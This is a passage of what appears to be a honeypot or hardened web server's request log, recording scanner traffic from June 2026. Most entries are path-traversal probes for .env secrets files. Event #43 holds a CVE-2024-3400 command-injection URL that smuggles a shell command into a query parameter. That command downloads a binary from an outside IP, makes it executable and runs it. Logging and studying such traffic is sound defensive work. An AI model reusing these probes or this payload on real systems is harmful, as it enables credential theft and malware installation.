+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #34 of 93
+========================================================================
+  Request ID:     1781171429818388910-8745
+  Timestamp:      2026-06-11T09:50:29.818389529Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /../../../.env
+  Path:           /../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     8 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:29 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #35 of 93
+========================================================================
+  Request ID:     1781171429820100455-8750
+  Timestamp:      2026-06-11T09:50:29.820107079Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /../../.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     6 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:29 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #36 of 93
+========================================================================
+  Request ID:     1781171429841055980-8796
+  Timestamp:      2026-06-11T09:50:29.84105658Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /../.env.local
+  Path:           /../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:29 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #37 of 93
+========================================================================
+  Request ID:     1781171429841724172-8799
+  Timestamp:      2026-06-11T09:50:29.841725008Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /../.env.production
+  Path:           /../.env.production
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:29 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #38 of 93
+========================================================================
+  Request ID:     1781171429843310472-8800
+  Timestamp:      2026-06-11T09:50:29.843311255Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /../../.env.local
+  Path:           /../../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     95 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:29 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #39 of 93
+========================================================================
+  Request ID:     1781171429944345307-8852
+  Timestamp:      2026-06-11T09:50:29.944345654Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /..%5C.env
+  Path:           /..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     0 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:29 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #40 of 93
+========================================================================
+  Request ID:     1781171430250323119-9006
+  Timestamp:      2026-06-11T09:50:30.250324115Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /../../../../.env
+  Path:           /../../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     90 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:30 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #41 of 93
+========================================================================
+  Request ID:     1781171440446380753-9713
+  Timestamp:      2026-06-11T09:50:40.446381304Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /..%5C..%5Cenv
+  Path:           /..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     96 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:40 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #42 of 93
+========================================================================
+  Request ID:     1781171440446715173-9714
+  Timestamp:      2026-06-11T09:50:40.446716049Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.110
+  URL:            /..%5C..%5C..%5Cenv
+  Path:           /..\..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     94 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Thu, 11 Jun 2026 09:50:40 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #43 of 93
+========================================================================
+  Request ID:     1781175991945468118-10022
+  Timestamp:      2026-06-11T11:06:31.945469498Z
+  Client IP:      176.65.148.183
+  Method:         GET
+  Host:           145.220.231.108:443
+  URL:            /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  Path:           /api/auth/validate-sso/../../../proxy/users/api/v2/ucs/update/latest_package
+  Query:          pkg_name=x$(%0Acd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+busybox+wget+http%3A%2F%2F185.228.26.16%2Fzok+-O+zok%3B+curl+-o+zok+http%3A%2F%2F185.228.26.16%2Fzok%3B+wget+http%3A%2F%2F185.228.26.16%2Fzok%3B+chmod+777+zok%3B+.%2Fzok+unifi.exploit%0A)&by_cmd=true
+  User-Agent:     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect command injection (Palo Alto PAN-OS, confirmed)
+  Request headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       404 404 Not Found
+    Duration:     0 ms
+    Headers:
+      Content-Length: 278
+      Content-Type: text/html; charset=iso-8859-1
+      Date: Thu, 11 Jun 2026 11:06:31 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (278 chars):
+    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+    <html><head>
+    <title>404 Not Found</title>
+    </head><body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <address>Apache/2.4.62 (Debian) Server at 145.220.231.108 Port 443</address>
+    </body></html>
+
+========================================================================
+EVENT #44 of 93
+========================================================================
+  Request ID:     1781233549797991431-11364
+  Timestamp:      2026-06-12T03:05:49.797992333Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.106
+  URL:            /../.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Fri, 12 Jun 2026 03:05:49 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #45 of 93
+========================================================================
+  Request ID:     1781233549798903086-11366
+  Timestamp:      2026-06-12T03:05:49.798903848Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.106
+  URL:            /../../.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Fri, 12 Jun 2026 03:05:49 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #46 of 93
+========================================================================
+  Request ID:     1781233549799501304-11367
+  Timestamp:      2026-06-12T03:05:49.799501903Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.106
+  URL:            /../.env.local
+  Path:           /../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Fri, 12 Jun 2026 03:05:49 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #47 of 93
+========================================================================
+  Request ID:     1781233549799941083-11368
+  Timestamp:      2026-06-12T03:05:49.799941789Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.106
+  URL:            /../../../.env
+  Path:           /../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Fri, 12 Jun 2026 03:05:49 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #48 of 93
+========================================================================
+  Request ID:     1781233549801644512-11369
+  Timestamp:      2026-06-12T03:05:49.801645663Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.106
+  URL:            /..%5C.env
+  Path:           /..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     0 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Fri, 12 Jun 2026 03:05:49 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #49 of 93
+========================================================================
+  Request ID:     1781233549802204116-11371
+  Timestamp:      2026-06-12T03:05:49.802204688Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.106
+  URL:            /../../.env.local
+  Path:           /../../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Fri, 12 Jun 2026 03:05:49 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #50 of 93
+========================================================================
+  Request ID:     1781233549802210535-11372
+  Timestamp:      2026-06-12T03:05:49.802211466Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.106
+  URL:            /../.env.production
+  Path:           /../.env.production
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Fri, 12 Jun 2026 03:05:49 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #51 of 93
+========================================================================
+  Request ID:     1781233549816943223-11387
+  Timestamp:      2026-06-12T03:05:49.816943966Z
+  Client IP:      176.65.144.128
+  Method:         GET
+  Host:           145.220.231.106
+  URL:            /../../../../.env
+  Path:           /../../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     0 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Fri, 12 Jun 2026 03:05:49 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #52 of 93
+========================================================================
+  Request ID:     1781471891293271333-3834
+  Timestamp:      2026-06-14T21:18:11.293272329Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     48 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:11 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #53 of 93
+========================================================================
+  Request ID:     1781471891295154627-3835
+  Timestamp:      2026-06-14T21:18:11.295155437Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../../../.env
+  Path:           /../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     46 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:11 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #54 of 93
+========================================================================
+  Request ID:     1781471891295654228-3837
+  Timestamp:      2026-06-14T21:18:11.295654697Z
